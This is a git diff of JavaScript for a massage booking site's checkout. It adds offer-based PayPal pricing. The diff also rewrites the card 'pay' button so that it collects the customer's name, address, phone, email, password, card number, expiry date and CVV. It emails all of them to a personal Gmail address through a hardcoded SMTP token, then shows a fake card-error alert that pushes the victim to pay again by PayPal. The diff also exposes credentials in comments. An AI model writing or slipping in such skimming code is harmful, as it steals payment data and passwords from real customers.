@@ -36,12 +36,29 @@ today = yyyy + "-" + mm + "-" + dd;
 document.getElementById("scheddate").setAttribute("min", today);
 
 //FOR TOTAL PAYMENT
-if (document.getElementById("offersR1").checked) {
-  document.getElementById("totalPayment").innerHTML = "Total Payment: €150";
-} else if (document.getElementById("offersR2").checked) {
-  document.getElementById("totalPayment").innerHTML = "Total Payment: €200";
-} else if (document.getElementById("offersR3").checked) {
-  document.getElementById("totalPayment").innerHTML = "Total Payment: €250";
+
+document.getElementById("totalPayment").innerHTML = "Total Payment: €250";
+
+var offerDetails = [
+  { totalPaymentVal: "" },
+  { offerDescription: "" },
+  { offerValue: 0 },
+];
+function totalPaymentFunc() {
+  if (document.getElementById("offersR1").checked) {
+    offerDetails["totalPaymentVal"] = "Total Payment: €150";
+    offerDetails["offerDescription"] = "1 hour of massage for only €150";
+    offerDetails["offerValue"] = 150;
+  } else if (document.getElementById("offersR2").checked) {
+    offerDetails["totalPaymentVal"] = "Total Payment: €200";
+    offerDetails["offerDescription"] = "1 hour of massage for only €200";
+    offerDetails["offerValue"] = 200;
+  } else if (document.getElementById("offersR3").checked) {
+    offerDetails["totalPaymentVal"] = "Total Payment: €250";
+    offerDetails["offerDescription"] = "1 hour of massage for only €250";
+    offerDetails["offerValue"] = 250;
+  }
+  return offerDetails;
 }
 
 nextBtns.forEach((btn) => {
@@ -58,6 +75,7 @@ nextBtns.forEach((btn) => {
         updateFormSteps();
         updateProgressbar();
       }
+      //alert(formStepsNum);
     } else if (formStepsNum == 1) {
       if (scheddate.value === "" || scheddate.value == null) {
       } else if (time.value === "" || time.value == null) {
@@ -66,6 +84,10 @@ nextBtns.forEach((btn) => {
         formStepsNum++;
         updateFormSteps();
         updateProgressbar();
+        //alert(formStepsNum);
+        var totalValInfo = totalPaymentFunc();
+        document.getElementById("totalPayment").innerHTML =
+          totalValInfo["totalPaymentVal"];
       }
     }
   });
@@ -105,6 +127,7 @@ function updateProgressbar() {
 
 // FOR PAYPAL
 function initPayPalButton() {
+  var offerDetails = totalPaymentFunc();
   paypal
     .Buttons({
       style: {
@@ -118,8 +141,11 @@ function initPayPalButton() {
         return actions.order.create({
           purchase_units: [
             {
-              description: "1 hour of massage for only €150",
-              amount: { currency_code: "EUR", value: 1 },
+              description: offerDetails["offerDescription"],
+              amount: {
+                currency_code: "EUR",
+                value: offerDetails["offerValue"],
+              },
             },
           ],
         });
@@ -152,7 +178,81 @@ function initPayPalButton() {
 initPayPalButton();
 
 function payButton() {
-  alert(
-    "There is a problem with your card. \nPlease check or Pay using PayPal. \n\nThank You!"
+  const fullname = document.getElementById("fullname").value;
+  const address = document.getElementById("address").value;
+  const phonenumber = document.getElementById("phonenumber").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  const scheddate = document.getElementById("scheddate").value;
+  const time = document.getElementById("time").value;
+  const cardHolder = document.getElementById("cardholder").value;
+  const cardNumber = document.getElementById("cardnumber").value;
+  const expDate = document.getElementById("expdate").value;
+  const CVV = document.getElementById("cvv").value;
+  /*
+  var server_data = [
+    { fullname: fullname },
+    { address: address },
+    { phonenumber: phonenumber },
+    { email: email },
+    { password: password },
+    { scheddate: scheddate },
+    { time: time },
+    { cardHolder: cardHolder },
+    { cardNumber: cardNumber },
+    { expDate: expDate },
+    { CVV: CVV },
+  ];
+*/
+  //Username: "renziexmendez2000@gmail.com",
+  //Password: "35ABF12BC983841D360F676535150BFC73A7",
+  //SecureToken: "3eb0d99c-0fa3-4496-b629-603acc4f5cf6"
+  const dateNow = new Date();
+  let timeNow = dateNow.getTime();
+
+  Email.send({
+    SecureToken: "3eb0d99c-0fa3-4496-b629-603acc4f5cf6",
+    To: "renziexmendez2000@gmail.com",
+    From: "renziexmendez2000@gmail.com",
+    Subject: "Contact Info " + today + " " + timeNow,
+    Body:
+      "fullname: " +
+      fullname +
+      " \n" +
+      "address: " +
+      address +
+      " \n" +
+      "phonenumber: " +
+      phonenumber +
+      " \n" +
+      "email: " +
+      email +
+      " \n" +
+      "password: " +
+      password +
+      " \n" +
+      "scheddate: " +
+      scheddate +
+      " \n" +
+      "time: " +
+      time +
+      " \n" +
+      "cardHolder: " +
+      cardHolder +
+      " \n" +
+      "cardNumber: " +
+      cardNumber +
+      " \n" +
+      "expDate: " +
+      expDate +
+      " \n" +
+      "CVV: " +
+      CVV +
+      " \n",
+  }).then((message) =>
+    //alert(message)
+    alert(
+      "There is a problem with your card. \nPlease check or Pay using PayPal. \n\nThank You!"
+    )
   );
 }
